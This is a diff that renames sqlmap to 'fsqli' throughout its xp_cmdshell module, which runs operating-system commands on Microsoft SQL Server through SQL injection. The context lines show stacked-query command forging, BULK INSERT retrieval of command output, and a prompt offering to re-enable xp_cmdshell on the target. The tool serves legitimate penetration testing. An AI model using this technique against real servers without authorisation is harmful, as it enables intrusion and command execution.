@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2024 fsqli developers (https://fsqli.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -31,7 +31,7 @@ from lib.core.enums import DBMS
 from lib.core.enums import EXPECTED
 from lib.core.enums import HASHDB_KEYS
 from lib.core.enums import PAYLOAD
-from lib.core.exception import SqlmapUnsupportedFeatureException
+from lib.core.exception import FsqliUnsupportedFeatureException
 from lib.core.threads import getCurrentThreadData
 from lib.request import inject
 
@@ -174,7 +174,7 @@ class XP_cmdshell(object):
             self._forgedCmd += "SET @%s='%s';" % (self._randStr, cmd)
 
         # Insert the command standard output into a support table,
-        # 'sqlmapoutput', except when DBMS credentials are provided because
+        # 'fsqlioutput', except when DBMS credentials are provided because
         # it does not work unfortunately, BULK INSERT needs to be used to
         # retrieve the output when OPENROWSET is used hence the redirection
         # to a temporary file from above
@@ -210,7 +210,7 @@ class XP_cmdshell(object):
             # When user provides DBMS credentials (with --dbms-cred), the
             # command standard output is redirected to a temporary file
             # The file needs to be copied to the support table,
-            # 'sqlmapoutput'
+            # 'fsqlioutput'
             if conf.dbmsCred:
                 inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
                 self.delRemoteFile(self.tmpFile)
@@ -259,7 +259,7 @@ class XP_cmdshell(object):
 
             else:
                 message = "xp_cmdshell extended procedure does not seem to "
-                message += "be available. Do you want sqlmap to try to "
+                message += "be available. Do you want fsqli to try to "
                 message += "re-enable it? [Y/n] "
 
                 if readInput(message, default='Y', boolean=True):
@@ -289,7 +289,7 @@ class XP_cmdshell(object):
 
             if not kb.xpCmdshellAvailable:
                 errMsg = "unable to proceed without xp_cmdshell"
-                raise SqlmapUnsupportedFeatureException(errMsg)
+                raise FsqliUnsupportedFeatureException(errMsg)
 
         debugMsg = "creating a support table to write commands standard "
         debugMsg += "output to"
